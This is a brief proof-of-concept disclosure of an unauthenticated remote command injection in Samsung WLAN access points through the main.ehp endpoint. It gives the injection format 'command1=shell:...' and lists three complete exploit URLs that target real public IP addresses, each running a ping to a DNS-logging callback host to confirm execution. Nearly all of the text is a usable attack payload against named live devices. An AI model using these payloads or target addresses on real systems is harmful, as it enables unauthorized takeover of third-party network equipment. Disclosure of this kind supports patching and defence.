Samsung WLAN AP, which has a command execution vulnerability, injects commands and executes them via remote without logging in.
main.ehp exists for remote command execution.
For example, execute the ping command through the shell.
Command format:&command1=shell:ping+dnslog
Execute commands directly through the browser without logging into the device.
xxx/main.ehp?cate=test&path=users&command1=shell:ping+dnslog
The following examples verify the existence of the vulnerability：

`http://220.92.38.104/main.ehp?cate=test&path=users&command1=shell:ping+ad1f15a7.dns.1433.eu.org`
./1.png
 
http://112.170.189.230/main.ehp?cate=test&path=users&command1=shell:ping+05c1e934.dns.1433.eu.org
 
http://121.174.124.33/main.ehp?cate=test&path=users&command1=shell:ping+78d29a40.dns.1433.eu.org
